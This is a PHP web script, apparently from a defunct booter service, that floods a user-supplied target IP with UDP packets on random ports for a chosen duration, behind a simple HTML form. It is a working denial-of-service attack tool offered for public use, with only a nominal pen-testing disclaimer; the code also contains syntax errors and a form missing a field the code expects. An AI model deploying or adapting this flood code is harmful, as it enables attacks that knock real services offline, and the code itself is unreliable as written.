<?php

// Written by @runconnor
// Official https://nailstress.in UDP attack script ( RIP 2015-2018 )
/*
   _______  ______  _________  ____  ____  ____  _____
  / ___/ / / / __ \/ ___/ __ \/ __ \/ __ \/ __ \/ ___/
 / /  / /_/ / / / / /__/ /_/ / / / / / / / /_/ / /    
/_/   \__,_/_/ /_/\___/\____/_/ /_/_/ /_/\____/_/     
                                                      
Free to use by the public and free to modify and clone.
DISCLAIMER: Please note, DDOS and or ( DOS ) is illegal and using this 
script for illicit purposes is is punishable by law. This script is
intended for white-hat security pen-testing only, or educational use only.
*/
//ini_set('display_errors', 1);
//error_reporting(-1);

if (isset($_REQUEST['host']) && isset($_REQUEST['time']) isset($_REQUEST['power']) ) {
    $packets = 0;
    $host = $_REQUEST['host'];
    $power = $_REQUEST['power'];
    $exec_time = $_REQUEST['time'];
    $time = time();
    $max_time = $time+$exec_time;

    if ($power == null) {
        $power = 65500;
    }
    
    if ($power < 1){
        $power = 50;
    }

    for($i-0;$i<$power;$i++) {
        $out .='Y';

    }
    while(1) {
        $packets++;
        if(time() > $max_time) {
            break;
        }
        $rand = rand(1,65535);
        $fp = fsockopen('udp://'.$host, $rand, $errno, $errstr, 5);
        if($fp) {
            fwrite($fp, $out);
            fclose($fp);
        }
    }
}
    
    
?>
<form>
<input type="textbox" name="host" placeholder="Target IP"/>
<input type="textbox" name="time" placeholder="Length"/>
<input type="submit" name="submit" value="submit"/>
</form>
